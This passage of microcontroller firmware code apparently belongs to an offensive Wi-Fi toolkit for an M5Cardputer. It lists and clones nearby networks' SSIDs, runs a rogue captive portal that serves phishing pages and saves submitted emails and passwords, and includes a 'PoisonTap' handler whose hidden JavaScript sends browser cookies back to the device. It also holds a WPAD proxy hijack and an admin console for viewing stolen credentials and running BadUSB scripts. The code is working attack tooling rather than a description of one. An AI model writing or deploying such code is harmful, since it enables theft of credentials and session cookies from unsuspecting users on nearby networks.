  auto moveUp = [&](){
    if (numSsid <= 0) return;
    currentListIndex--;
    if (currentListIndex < 0) currentListIndex = numSsid - 1;
  };
  auto moveDown = [&](){
    if (numSsid <= 0) return;
    currentListIndex++;
    if (currentListIndex >= numSsid) currentListIndex = 0;
  };

  bool needsDisplayUpdate = true;
  enterDebounce();
  static bool keyHandledEnter = false;

  while (!inMenu) {
    if (needsDisplayUpdate) {
      M5.Display.fillRect(0, 0, LIST_WIDTH, LIST_HEIGHT, menuBackgroundColor);

      const int lines = LIST_HEIGHT / ROW_H;
      int listStartIndex = clampi(currentListIndex - lines/2, 0, max(0, numSsid - lines));

      M5.Display.setFont(&fonts::Font0);
      M5.Display.setTextSize(1);

      for (int row = 0; row < lines; ++row) {
        int i = listStartIndex + row;
        if (i >= numSsid) break;
        int y = row * ROW_H;

        bool focused = (i == currentListIndex);
        if (focused) {
          M5.Display.fillRect(0, y, LIST_WIDTH, ROW_H, menuSelectedBackgroundColor);
          M5.Display.setTextColor(menuTextFocusedColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor);
        }

        // MÃ©ta Ã  droite
        String meta = "ch" + String(chanCache[i] ? chanCache[i] : 0) + " " + String(rssiCache[i]) + "dBm";
        int metaW = M5.Display.textWidth(meta);
        int metaX = LIST_WIDTH - metaW - 2;
        if (metaX < LEFT_PAD + ICON_W + 6) metaX = LEFT_PAD + ICON_W + 6;

        // IcÃ´nes gauche
        int iconX = LEFT_PAD;
        drawRssiBars(iconX, y, rssiCache[i]);
        drawLockIcon(iconX + 12, y + 1, lockCache[i]);

        // SSID tronquÃ©
        int textX = LEFT_PAD + ICON_W;
        int maxTextW = max(0, metaX - textX - 2);
        String line = truncateToWidth(ssidList[i], maxTextW);
        M5.Display.setTextSize(1.3);
        M5.Display.setCursor(textX, y + 1);
        M5.Display.print(line);
        M5.Display.setTextSize(1);
        
        // MÃ©ta
        M5.Display.setCursor(metaX, y + 1);
        M5.Display.print(meta);
      }

      drawScrollbar(clampi(currentListIndex - (LIST_HEIGHT/ROW_H)/2, 0, max(0, numSsid - (LIST_HEIGHT/ROW_H))), LIST_HEIGHT/ROW_H, numSsid);
      M5.Display.display();
      needsDisplayUpdate = false;
    }

    // pump
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();
    delay(10);

    // --- navigation auto-repeat ---
    bool up = M5Cardputer.Keyboard.isKeyPressed(';');
    bool dn = M5Cardputer.Keyboard.isKeyPressed('.');

    unsigned long now = millis();

    if (up && !prevUp) { moveUp(); needsDisplayUpdate = true; upHoldStart = upLastRepeat = now; }
    if (dn && !prevDown){ moveDown(); needsDisplayUpdate = true; downHoldStart = downLastRepeat = now; }

    if (up && prevUp && (now - upHoldStart >= firstDelay) && (now - upLastRepeat >= repeatDelay)) {
      moveUp(); needsDisplayUpdate = true; upLastRepeat = now;
    }
    if (dn && prevDown && (now - downHoldStart >= firstDelay) && (now - downLastRepeat >= repeatDelay)) {
      moveDown(); needsDisplayUpdate = true; downLastRepeat = now;
    }

    prevUp = up;
    prevDown = dn;

    // ENTER
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandledEnter) {
      inMenu = true;
      Serial.println(F("-------------------"));
      Serial.println("SSID " + ssidList[currentListIndex] + " selected");
      Serial.println(F("-------------------"));
      waitAndReturnToMenu(ssidList[currentListIndex] + " selected");
      needsDisplayUpdate = true;
      keyHandledEnter = true;
    }
    // BACK
    else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      inMenu = true;
      drawMenu();
      break;
    }
    else if (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      keyHandledEnter = false;
    }
  }
}




void showWifiDetails(int networkIndex) {
  inMenu = false;
  bool keyHandled = false;  // Pour gÃ©rer la rÃ©ponse Ã  la touche une fois

  auto updateDisplay = [&]() {
    if (networkIndex >= 0 && networkIndex < numSsid) {
      M5.Display.clear();
      M5.Display.setTextSize(1.5);
      int y = 2;
      int x = 0;

      // SSID
      M5.Display.setCursor(x, y);
      M5.Display.println("SSID:" + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "N/A"));
      y += 20;

      // Channel
      int channel = WiFi.channel(networkIndex);
      M5.Display.setCursor(x, y);
      M5.Display.println("Channel:" + (channel > 0 ? String(channel) : "N/A"));
      y += 16;

      // Security
      String security = getWifiSecurity(networkIndex);
      M5.Display.setCursor(x, y);
      M5.Display.println("Security:" + (security.length() > 0 ? security : "N/A"));
      y += 16;

      // Signal Strength
      int32_t rssi = WiFi.RSSI(networkIndex);
      M5.Display.setCursor(x, y);
      M5.Display.println("Signal:" + (rssi != 0 ? String(rssi) + " dBm" : "N/A"));
      y += 16;

      // MAC Address
      uint8_t* bssid = WiFi.BSSID(networkIndex);
      String macAddress = bssidToString(bssid);
      M5.Display.setCursor(x, y);
      M5.Display.println("MAC:" + (macAddress.length() > 0 ? macAddress : "N/A"));
      y += 16;

      M5.Display.setCursor(80, 110);
      M5.Display.println("ENTER:Clone");
      M5.Display.setCursor(20, 110);
      M5.Display.println("<");
      M5.Display.setCursor(M5.Display.width() - 20 , 110);
      M5.Display.println(">");

      M5.Display.display();
    }
  };

  updateDisplay();

  enterDebounce();
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplÃ©mentaires

  while (!inMenu) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
        cloneSSIDForCaptivePortal(ssidList[networkIndex]);
        inMenu = true;
        waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
        drawMenu();
        break; // Sortir de la boucle
      } else if (M5Cardputer.Keyboard.isKeyPressed('/') && !keyHandled) {
        networkIndex = (networkIndex + 1) % numSsid;
        updateDisplay();
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) && !keyHandled) {
        inMenu = true;
        drawMenu();
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed(',') && !keyHandled) {
        networkIndex = (networkIndex - 1 + numSsid) % numSsid;
        updateDisplay();
        lastKeyPressTime = millis();
      }

      if (!M5Cardputer.Keyboard.isKeyPressed('/') &&
          !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) &&
          !M5Cardputer.Keyboard.isKeyPressed(',') &&
          !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        keyHandled = false;
      }
    }
  }
}



String getWifiSecurity(int networkIndex) {
  switch (WiFi.encryptionType(networkIndex)) {
    case WIFI_AUTH_OPEN:
      return "Open";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA_WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    default:
      return "Unknown";
  }
}

String bssidToString(uint8_t* bssid) {
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(mac);
}

void cloneSSIDForCaptivePortal(String ssid) {
  clonedSSID = ssid;
}


// Global variables specific to save-file function
File saveFileObject;             // File object for saving
bool isSaveFileAuthorized = false; // Authorization flag for saving file




/*
  ============================================================================================================================
  PoisonTap
  ============================================================================================================================
*/
void logCookiesToSD(String cookies, String domain) {
  File file = SD.open("/evil/cookies.log", FILE_APPEND);
  if (file) {
    // On log lâ€™information de maniÃ¨re plus complÃ¨te
    file.println("Siphon Entry");
    file.println("  Domain : " + domain);
    file.println("  Cookies: " + cookies);
    file.println("----------");
    file.close();
  } else {
    Serial.println(F("Failed to open cookies log file!"));
  }
}

void handleCookieSiphoning() {
  // RÃ©cupÃ©rer le paramÃ¨tre 'domain' depuis la query string
  String paramDomain = server.arg("domain");
  if (paramDomain.isEmpty()) {
    paramDomain = "UnknownDomain";  // Fallback si le paramÃ¨tre n'est pas envoyÃ©
  }

  // Construction du payload HTML avec corrections
  String payload = R"rawliteral(
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Cookie Siphoning</title>
  </head>
  <body>
    <script>
      document.addEventListener("DOMContentLoaded", function() {
        try {
          const cookies = document.cookie;
          if (cookies) {
            const img = document.createElement('img');
            img.style.display = 'none';
            img.src = `http://${encodeURIComponent(')rawliteral" + paramDomain + R"rawliteral(')}/logcookie?cookies=${encodeURIComponent(cookies)}&domain=${encodeURIComponent(')rawliteral" + paramDomain + R"rawliteral(')}`;
            document.body.appendChild(img);
          }
        } catch (error) {
          console.error('Error siphoning cookies:', error);
        }
      });
    </script>
  </body>
</html>
)rawliteral";

  // Ajout des en-tÃªtes personnalisÃ©s
  server.sendHeader("Content-Type", "text/html; charset=UTF-8");
  server.sendHeader("Server", "EvilTap/1.0 7h30th3r0n3/0.1");
  server.sendHeader("Cache-Control", "public, max-age=99936000");
  server.sendHeader("Expires", "Sat, 26 Jul 2040 05:00:00 GMT");
  server.sendHeader("Last-Modified", "Tue, 15 Nov 1994 12:45:26 GMT");
  server.sendHeader("Access-Control-Allow-Origin", "*");

  // Envoi de la rÃ©ponse avec le contenu HTML
  server.send(200, "text/html", payload);
}






/*
============================================================================================================================
Captive portal
============================================================================================================================
*/

void handleLogRequest() {
  // RÃ©cupÃ©rer les cookies
  String cookies = server.arg("cookies");
  // RÃ©cupÃ©rer le paramÃ¨tre 'domain'
  String paramDomain = server.arg("domain");

  if (cookies.isEmpty()) {
    Serial.println(F("RequÃªte ignorÃ©e : cookies vides."));
    server.send(204, "text/plain", ""); // RÃ©ponse vide
    return;
  }
  if (paramDomain.isEmpty()) {
    paramDomain = "UnknownDomain";
  }

  // RÃ©cupÃ©rer le Referer depuis les en-tÃªtes
  String referer = server.header("Referer");
  if (referer.isEmpty()) {
    referer = "UnknownReferer";
  }

  // Affichage debug sur le port sÃ©rie
  Serial.println(F("Cookies receiveds via /log :"));
  Serial.println("  Domain : " + paramDomain);
  Serial.println("  Cookies: " + cookies);
  Serial.println(F("----------------------"));

  // Journaliser dans le fichier
  logCookiesToSD(cookies, paramDomain);

  // RÃ©ponse 1x1 pixel
  server.send(200, "image/gif",
    "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\xff\x00"
    "\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x01"
    "\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02"
    "\x44\x01\x00\x3b");
}


void servePortalFileWithReplace(const String &path, const String &replaceIP) {
    File f = SD.open(path);
    if (!f) {
        server.send(404, "text/plain", "File not found");
        return;
    }

    // En-tÃªte HTTP
    server.setContentLength(CONTENT_LENGTH_UNKNOWN);
    server.send(200, "text/html", "");
    
    const size_t bufSize = 512;
    char buf[bufSize + 1]; // +1 pour terminer la string

    while (f.available()) {
        size_t len = f.readBytes(buf, bufSize);
        buf[len] = '\0'; // sÃ©curitÃ©

        String chunk(buf);
        chunk.replace("192.168.4.1", replaceIP);
        server.sendContent(chunk);
    }

    f.close();
    server.sendContent(""); // flush
    server.client().stop();
}



void createCaptivePortal() {
  String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
  // VÃ©rification de la connexion Wi-Fi et mise Ã  jour des variables

  if (!isAutoKarmaActive) {
    // Choix du mode AP ou AP+STA selon l'IP actuelle
    if (WiFi.localIP().toString() == "0.0.0.0") {
      WiFi.mode(WIFI_MODE_AP);
    } else {
      WiFi.mode(WIFI_MODE_APSTA);
    }
    
   IPAddress apIP = getSelectedPortalIP();
    if (!WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0))) {
      Serial.println(F("[-] softAPConfig failed, keep default"));
    } else {
      Serial.print(F("[CFG] AP IP = ")); Serial.println(apIP);
    }
    
    // ParamÃ¨tres pour softAP()
    const int  channel       = 1;     // canal Wi-Fi (1 Ã  13 selon norme)
    const bool ssid_hidden   = false; // SSID visible
    const int  max_clients   = 10;     // autoriser jusqu'Ã  10 clients

    // Appel Ã  5 paramÃ¨tres pour augmenter la limite
    if (captivePortalPassword.isEmpty()) {
      WiFi.softAP(ssid.c_str(),       // SSID
                  nullptr,            // pas de mot de passe
                  channel, 
                  ssid_hidden, 
                  max_clients);
    } else {
      WiFi.softAP(ssid.c_str(),                       // SSID
                  captivePortalPassword.c_str(),     // mot de passe
                  channel, 
                  ssid_hidden, 
                  max_clients);
    }
  }

  // RÃ©cupÃ¨re les IP AP et STA
  ipAP  = WiFi.softAPIP();
  ipSTA = WiFi.localIP();
  
  dnsServer.start(DNS_PORT, "*", ipAP);
  isCaptivePortalOn = true;
  
  server.on("/siphon", handleCookieSiphoning);
  server.on("/logcookie", handleLogRequest);
  server.on("/wpad.dat", HTTP_GET, []() {
  String pac = "function FindProxyForURL(url, host) { return \"PROXY " + ipAP.toString() + ":80; DIRECT\"; }";
  server.send(200, "application/x-ns-proxy-autoconfig", pac);
  Serial.println(String("[+] WPAD sent with proxy ")+ ipAP.toString() +":80");
  });
  
  server.on("/", HTTP_GET, []() {
      String email = server.arg("email");
      String password = server.arg("password");
  
      if (!email.isEmpty() && !password.isEmpty()) {
          saveCredentials(email, password, selectedPortalFile.substring(12), clonedSSID);
          server.send(200, "text/plain", "Credentials Saved");
      } else {
          Serial.println(F("-------------------"));
          Serial.println(F("Direct Web Access !!!"));
          Serial.println(F("-------------------"));
  
          IPAddress clientIP = server.client().remoteIP();
  
          if (portalIpIndex == 0 && clientIP[0] == 192 && clientIP[1] == 168 && clientIP[2] == 4) {
              File f = SD.open(selectedPortalFile);
              if (f) {
                  server.streamFile(f, "text/html");
                  f.close();
              } else {
                  server.send(404, "text/plain", "File not found");
              }
          } 
          else if (portalIpIndex == 1 && clientIP[0] == 172 && clientIP[1] == 0 && clientIP[2] == 0) {
              servePortalFileWithReplace(selectedPortalFile, "172.0.0.1");
          } 
          else {
              servePortalFileWithReplace(selectedPortalFile, ipSTA.toString());
          }
      }
  });

  // Legacy route: redirect to the new admin dashboard
  server.on("/evil-m5core2-menu", HTTP_GET, []() {
      server.sendHeader("Location", "/evil-menu", true);
      server.send(302, "text/plain", "");
  });

  // Unified admin dashboard (Basic Auth protected)
server.on("/evil-menu", HTTP_GET, []() {
  if (!guardAdmin()) return;
  static const char ADMIN_HTML[] PROGMEM = R"HTML(<!doctype html><html lang=en><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Admin</title><style>:root{--bg0:#0b1020;--bg1:#0f1a33;--card:rgba(255,255,255,.10);--card2:rgba(255,255,255,.14);--txt:#e9eefc;--mut:rgba(233,238,252,.72);--st:rgba(255,255,255,.14);--acc:#4c7dff;--r:16px;--sh:0 18px 60px rgba(0,0,0,.42)}@media(prefers-color-scheme:light){:root{--bg0:#f4f7ff;--bg1:#eef2ff;--card:rgba(255,255,255,.92);--card2:rgba(255,255,255,.98);--txt:#0e1730;--mut:rgba(14,23,48,.66);--st:rgba(14,23,48,.12);--sh:0 18px 60px rgba(14,23,48,.14)}}*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;padding:22px;color:var(--txt);font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;background:radial-gradient(1200px 600px at 15% 10%,rgba(76,125,255,.35),transparent 60%),radial-gradient(900px 500px at 85% 20%,rgba(40,215,198,.22),transparent 55%),linear-gradient(160deg,var(--bg0),var(--bg1))}.m{width:100%;max-width:520px;background:linear-gradient(180deg,var(--card2),var(--card));border:1px solid var(--st);border-radius:var(--r);box-shadow:var(--sh);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);overflow:hidden}.h{padding:18px 18px 12px;border-bottom:1px solid var(--st)}.t{margin:0;font-size:18px;letter-spacing:.2px}.s{margin:5px 0 0;font-size:13px;color:var(--mut)}.g{padding:12px;display:grid;gap:10px}a.i{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 12px;border-radius:14px;text-decoration:none;color:var(--txt);background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.10);transition:transform .10s ease,background .15s ease,border-color .15s ease,box-shadow .15s ease;outline:none}a.i:after{content:"â€º";font-size:20px;opacity:.7;line-height:1}a.i:hover{transform:translateY(-1px);background:rgba(255,255,255,.10);border-color:rgba(255,255,255,.18);box-shadow:0 10px 22px rgba(0,0,0,.22)}a.i:active{transform:translateY(0) scale(.995)}a.i:focus-visible{box-shadow:0 0 0 3px rgba(76,125,255,.35),0 10px 22px rgba(0,0,0,.22);border-color:rgba(76,125,255,.55)}.k{display:flex;flex-direction:column;min-width:0}.l{font-weight:650;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.p{font-size:12px;color:var(--mut);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.f{padding:10px 12px 14px;border-top:1px solid var(--st);color:var(--mut);font-size:12px;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}@media(max-width:420px){body{padding:16px}.g{padding:10px}.p{display:none}}</style><body><div class=m><div class=h><h2 class=t>Evil Admin Console</h2><p class=s>Quick actions and monitoring</p></div><div class=g><a class=i href=/credentials><span class=k><span class=l>Credentials</span><span class=p>View and manage stored credentials</span></span></a><a class=i href=/uploadhtmlfile><span class=k><span class=l>Upload to SD</span><span class=p>Upload files to the SD card</span></span></a><a class=i href=/check-sd-file><span class=k><span class=l>Browse SD</span><span class=p>List, open, and verify SD contents</span></span></a><a class=i href=/setup-portal><span class=k><span class=l>Setup Portal</span><span class=p>Configure portal settings</span></span></a><a class=i href=/list-badusb-scripts><span class=k><span class=l>Run Script</span><span class=p>List and execute an existing script</span></span></a><a class=i href=/scan-network><span class=k><span class=l>Scan Network</span><span class=p>Fast discovery and inventory</span></span></a><a class=i href=/monitor-status><span class=k><span class=l>Monitor Status</span><span class=p>Resources, uptime, and events</span></span></a></div><div class=f><span>WebUI v2</span><span>Responsive â€¢ Dark mode â€¢ Accessible</span></div></div></html>)HTML";
  server.send_P(200, "text/html", ADMIN_HTML);
});



  server.on("/credentials", HTTP_GET, []() {
    if (!guardAdmin()) return;
    File file = SD.open("/evil/credentials.txt");
    if (!file) {
      String content;
      content += F("<p>File not found.</p>");
      content += F("<div class='actions'><a class='btn' href='/evil-menu'>Back to Dashboard</a></div>");
      server.send(404, "text/html", wrapAdminPage("Credentials", content));
      return;
    }

    if (file.size() == 0) {
      String content;
      content += F("<p>No credentials found.</p>");
      content += F("<div class='actions'><a class='btn' href='/evil-menu'>Back to Dashboard</a></div>");
      server.send(200, "text/html", wrapAdminPage("Credentials", content));
      file.close();
      return;
    }

    String content;
    content.reserve(2048);
    content += F("<div class='scroll-x'><table class='wide'><tr><th>Email</th><th>Password</th><th>Portal</th><th>SSID</th></tr>");

    enum { NONE, EMAIL_NEXT, PASS_NEXT, PORTAL_NEXT, SSID_NEXT } st = NONE;
    String email="", pass="", portal="", ssid="";
    int rows = 0;
    while (file.available()) {
      String line = file.readStringUntil('\n');
      line.trim();
      if (line.length() == 0) continue;

      if (line.startsWith("-- Email")) { st = EMAIL_NEXT; continue; }
      if (line.startsWith("-- Password")) { st = PASS_NEXT; continue; }
      if (line.startsWith("-- Portal")) { st = PORTAL_NEXT; continue; }
      if (line.startsWith("-- SSID")) { st = SSID_NEXT; continue; }
      if (line.startsWith("---")) {
        if (email.length() || pass.length() || portal.length() || ssid.length()) {
          content += F("<tr><td>"); content += htmlEscape(email);
          content += F("</td><td>"); content += htmlEscape(pass);
          content += F("</td><td>"); content += htmlEscape(portal);
          content += F("</td><td>"); content += htmlEscape(ssid);
          content += F("</td></tr>");
          rows++;
          email=""; pass=""; portal=""; ssid=""; st = NONE;
        }
        continue;
      }

      switch (st) {
        case EMAIL_NEXT:  email  = line; st = NONE; break;
        case PASS_NEXT:   pass   = line; st = NONE; break;
        case PORTAL_NEXT: portal = line; st = NONE; break;
        case SSID_NEXT:   ssid   = line; st = NONE; break;
        default: break;
      }
    }
    file.close();

    // Flush last block if file didn't end with delimiter
    if (email.length() || pass.length() || portal.length() || ssid.length()) {
      content += F("<tr><td>"); content += htmlEscape(email);
      content += F("</td><td>"); content += htmlEscape(pass);
      content += F("</td><td>"); content += htmlEscape(portal);
      content += F("</td><td>"); content += htmlEscape(ssid);
      content += F("</td></tr>");
      rows++;
    }

    content += F("</table></div>");
    if (rows == 0) {
      content += F("<p class='mut'>No entries parsed in credentials file.</p>");
    }
    content += F("<div class='actions'><a class='btn' href='/evil-menu'>Back to Dashboard</a></div>");
    server.send(200, "text/html", wrapAdminPage("Credentials", content));
  });


  server.on("/check-sd-file", HTTP_GET, handleSdCardBrowse);
  server.on("/download-sd-file", HTTP_GET, handleFileDownload);
  server.on("/download-all-files", HTTP_GET, handleDownloadAllFiles);
  server.on("/list-directories", HTTP_GET, handleListDirectories);


  server.on("/uploadhtmlfile", HTTP_GET, [=]() {
    if (!guardAdmin()) return;
    String html;

    html += "<!DOCTYPE html><html><head>";
    html += "<meta charset='UTF-8'>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
    html += "<title>Evil File Upload</title>";

    html += "<style>";
    html += "body{margin:0;min-height:100vh;display:grid;place-items:center;padding:22px;color:#e9eefc;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;background:radial-gradient(1200px 600px at 15% 10%,rgba(76,125,255,.35),transparent 60%),radial-gradient(900px 500px at 85% 20%,rgba(40,215,198,.22),transparent 55%),linear-gradient(160deg,#0b1020,#0f1a33);}";
    html += ".container{width:90%;max-width:520px;background:linear-gradient(180deg,rgba(255,255,255,.14),rgba(255,255,255,.10));border:1px solid rgba(255,255,255,.14);border-radius:16px;box-shadow:0 18px 60px rgba(0,0,0,.42);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);padding:16px;text-align:center;color:#e9eefc;}";
    html += "h2{color:#007bff;margin-bottom:15px;}";

    html += "select,input[type=file]{width:100%;padding:12px;border:1px solid #d5d5d5;border-radius:6px;margin-bottom:10px;background:white;font-size:15px;box-sizing:border-box;}";
    // Ensure readable text on white controls
    html += "select,input[type=file]{color:#0e1730;}";
    html += "select option{color:#0e1730;}";

    html += "#dropZone{width:100%;padding:20px;margin-bottom:12px;border:2px dashed #007bff;border-radius:10px;color:#007bff;background:#eef5ff;cursor:pointer;transition:0.2s;box-sizing:border-box;display:block;}";
    html += "#dropZone.dragover{background:#d8e9ff;border-color:#0056b3;color:#0056b3;}";

    html += "#fileList{text-align:left;font-size:14px;max-height:150px;overflow-y:auto;margin-top:10px;color:#333;}";

    html += "#progressBar{width:100%;height:10px;background:#d8d8d8;border-radius:5px;margin:15px auto;overflow:hidden;}";
    html += "#progressFill{height:100%;width:0%;background:#007bff;transition:width 0.1s linear;}";

    html += "#doneBox{display:none;margin-top:10px;padding:10px;background:#28a745;color:white;border-radius:6px;font-size:14px;}";

    html += "button{width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:6px;cursor:pointer;font-size:16px;}";
    html += "button:hover{background:#0056b3;}";
    html += "</style></head>";

    html += "<body><div class='container'>";
    html += "<h2>Upload Files</h2>";

    html += "<select id='dirSelect'><option value='loading'>Loading...</option></select>";

    html += "<div id='dropZone'>Drag & Drop file here</div>";
    html += "<input type='file' id='fileInput' multiple>";
    html += "<div id='fileList'></div>";

    html += "<div id='progressBar'><div id='progressFill'></div></div>";
    html += "<div id='doneBox'>âœ” Upload complete</div>";

    html += "<p style='margin:10px 0'><a href='/evil-menu' style='text-decoration:none;color:#007bff'>â† Back to Dashboard</a></p>";
    html += "<button id='uploadBtn'>Upload</button>";
    html += "</div>";

    // JS =================================================================
    html += "<script>";
    html += "const pass=null;";
    html += "let filesToUpload=[];";

    // Load full recursive directory list
    html += "fetch('/list-directories').then(r=>r.text()).then(t=>{";
    html += "const s=document.getElementById('dirSelect');";
    html += "s.innerHTML='';";
    html += "t.split('\\n').forEach(d=>{if(d.trim()!==''){let o=document.createElement('option');o.value=d;o.textContent=d;s.appendChild(o);}});";
    html += "});";

    // Add files
    html += "function addFiles(flist){for(let f of flist){filesToUpload.push(f);}refreshList();}";

    // Refresh list
    html += "function refreshList(){let h='';filesToUpload.forEach((f)=>{h+='â€¢ '+f.name+' ('+f.size+' bytes)<br>';});document.getElementById('fileList').innerHTML=h;}";

    // Input
    html += "document.getElementById('fileInput').addEventListener('change',function(){addFiles(this.files);});";

    // Drag-drop
    html += "const drop=document.getElementById('dropZone');";
    html += "drop.addEventListener('dragover',e=>{e.preventDefault();drop.classList.add('dragover');});";
    html += "drop.addEventListener('dragleave',()=>drop.classList.remove('dragover'));";
    html += "drop.addEventListener('drop',e=>{e.preventDefault();drop.classList.remove('dragover');addFiles(e.dataTransfer.files);});";

    // Upload logic FIXED ( pauses + reset + complete message )
    html += "document.getElementById('uploadBtn').addEventListener('click',function(){";
    html += "if(filesToUpload.length===0){alert('No files selected.');return;}";

    html += "let dir=document.getElementById('dirSelect').value;";
    html += "let i=0;";

    html += "function next(){";
    html += "if(i>=filesToUpload.length){document.getElementById('doneBox').style.display='block';document.getElementById('progressFill').style.width='0%';alert('Upload complete');return;}";

    html += "let file=filesToUpload[i];";
    html += "let fd=new FormData();fd.append('file',file);";
    html += "let x=new XMLHttpRequest();";
    html += "x.open('POST','/upload?directory='+encodeURIComponent(dir),true);";

    html += "x.upload.onprogress=function(e){if(e.lengthComputable){let p=(e.loaded/e.total)*100;document.getElementById('progressFill').style.width=p+'%';}};";

    html += "x.onload=function(){if(x.status===200){i++;setTimeout(()=>{document.getElementById('progressFill').style.width='0%';next();},150);}else{alert('Upload failed for '+file.name);}};";

    html += "x.send(fd);";
    html += "}";

    html += "next();";
    html += "});";

    html += "</script>";
    html += "</body></html>";

    server.send(200, "text/html", html);
  });


  server.on("/upload", HTTP_POST, []() {
      if (!guardAdmin()) return;
      server.send(200);
  }, handleFileUpload);

  // Unified-styled upload page (uses shared admin wrapper)
  server.on("/upload-ui", HTTP_GET, []() {
    if (!guardAdmin()) return;
    String content;
    content += F("<div class='row'><select id='dirSelect'><option value='loading'>Loading...</option></select></div>");
    content += F("<div id='dropZone'>Drag & Drop file here</div>");
    content += F("<input type='file' id='fileInput' multiple>");
    content += F("<div id='fileList'></div>");
    content += F("<div id='progressBar'><div id='progressFill'></div></div>");
    content += F("<div id='doneBox'>Upload complete</div>");
    content += F("<div class='actions'><a class='btn p' href='#' id='uploadBtn'>Upload</a></div>");
    content += F("<script>");
    content += F("let filesToUpload=[];\n");
    content += F("fetch('/list-directories').then(r=>r.text()).then(t=>{const s=document.getElementById('dirSelect');s.innerHTML='';t.split('\\n').forEach(d=>{if(d.trim()!==''){let o=document.createElement('option');o.value=d;o.textContent=d;s.appendChild(o);}});});\n");
    content += F("function addFiles(flist){for(let f of flist){filesToUpload.push(f);}refreshList();}\n");
    content += F("function refreshList(){let h='';filesToUpload.forEach((f)=>{h+='â€¢ '+f.name+' ('+f.size+' bytes)<br>';});document.getElementById('fileList').innerHTML=h;}\n");
    content += F("document.getElementById('fileInput').addEventListener('change',function(){addFiles(this.files);});\n");
    content += F("const drop=document.getElementById('dropZone');drop.addEventListener('dragover',e=>{e.preventDefault();drop.classList.add('dragover');});drop.addEventListener('dragleave',()=>drop.classList.remove('dragover'));drop.addEventListener('drop',e=>{e.preventDefault();drop.classList.remove('dragover');addFiles(e.dataTransfer.files);});\n");
    content += F("document.getElementById('uploadBtn').addEventListener('click',function(e){e.preventDefault();if(filesToUpload.length===0){alert('No files selected.');return;}let dir=document.getElementById('dirSelect').value;let i=0;function next(){if(i>=filesToUpload.length){document.getElementById('doneBox').style.display='block';document.getElementById('progressFill').style.width='0%';return;}let file=filesToUpload[i];let fd=new FormData();fd.append('file',file);let x=new XMLHttpRequest();x.open('POST','/upload?directory='+encodeURIComponent(dir),true);x.upload.onprogress=function(e){if(e.lengthComputable){let p=(e.loaded/e.total)*100;document.getElementById('progressFill').style.width=p+'%';}};x.onload=function(){if(x.status===200){i++;setTimeout(()=>{document.getElementById('progressFill').style.width='0%';next();},150);}else{alert('Upload failed for '+file.name);}};x.send(fd);}next();});\n");
    content += F("</script>");
    server.send(200, "text/html", wrapAdminPage("Upload Files", content));
  });

  server.on("/delete-sd-file", HTTP_GET, handleFileDelete);

  server.on("/setup-portal", HTTP_GET, []() {
      if (!guardAdmin()) return;

      // Lister les fichiers HTML disponibles dans le dossier /sites avec un indice
      String portalOptions = "";
      File root = SD.open("/evil/sites");
      int index = 0;  // Initialiser un indice pour chaque fichier

      while (File file = root.openNextFile()) {
          if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
              // Ajouter l'indice comme valeur pour chaque option
              portalOptions += "<option value='" + String(index) + "'>" + file.name() + "</option>";
              index++;
          }
          file.close();
      }
      root.close();

      String content;
      content += F("<form action='/update-portal-settings' method='get'>");
      content += F("<div class='row'><input type='text' name='newSSID' placeholder='SSID / Portal name'><input type='password' name='newPassword' placeholder='Password (optional)'></div>");
      content += F("<div class='row'><select name='portalIndex'>");
      content += portalOptions;
      content += F("</select></div>");
      content += F("<div class='actions'><button class='btn p' type='submit'>Save Settings</button></div></form>");
      content += F("<div class='actions'><a class='btn g' href='/start-portal'>Start Portal</a><a class='btn' href='/stop-portal'>Stop Portal</a></div>");

      server.send(200, "text/html", wrapAdminPage("Setup Portal", content));
      });
  
  
  
  
  
    
  server.on("/update-portal-settings", HTTP_GET, []() {
      if (!guardAdmin()) return;
  
      String newSSID = server.arg("newSSID");
      String newPassword = server.arg("newPassword");
